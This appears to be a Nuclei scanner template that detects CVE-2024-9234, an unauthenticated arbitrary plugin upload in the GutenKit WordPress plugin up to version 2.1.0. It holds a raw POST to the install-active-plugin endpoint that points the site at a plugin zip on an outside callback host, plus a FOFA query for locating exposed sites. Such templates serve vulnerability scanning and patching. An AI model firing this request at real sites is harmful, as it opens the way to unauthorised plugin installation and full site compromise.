flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "/wp-content/plugins/gutenkit-blocks-addon")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "Failed to unzip plugin", "success\":false")
    - contains(content_type, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /wp-json/gutenkit/v1/install-active-plugin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    plugin=http://{{interactsh-url}}/{{filename}}.zip

    '
id: CVE-2024-9234
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-9234
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.99762
    epss-score: 0.92948
  description: 'The GutenKit Page Builder Blocks, Patterns, and Templates for Gutenberg
    Block Editor plugin for WordPress is vulnerable to arbitrary file uploads due
    to a missing capability check on the install_and_activate_plugin_from_external()
    function (install-active-plugin REST API endpoint) in all versions up to, and
    including, 2.1.0. This makes it possible for unauthenticated attackers to install
    and activate arbitrary plugins, or utilize the functionality to upload arbitrary
    files spoofed like plugins.

    '
  impact: 'Unauthenticated attackers can install and activate arbitrary WordPress
    plugins or upload files disguised as plugins, enabling remote code execution and
    complete WordPress site compromise.

    '
  metadata:
    fofa-query: body="wp-content/plugins/gutenkit-blocks-addon"
    framework: wordpress
    max-request: 2
    product: gutenkit
    vendor: wpmet
    verified: true
  name: GutenKit <= 2.1.0 - Arbitrary File Upload
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-9234
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/gutenkit-blocks-addon/gutenkit-210-unauthenticated-arbitrary-file-upload
  remediation: 'Update GutenKit plugin to a version later than 2.1.0 that implements
    proper capability checks on the install_and_activate_plugin_from_external function
    and REST API endpoint.

    '
  severity: critical
  tags: cve,cve2024,wordpress,wp-plugin,gutenkit,file-upload,intrusive,vkev,vuln
variables:
  filename: '{{rand_text_alpha(12)}}'
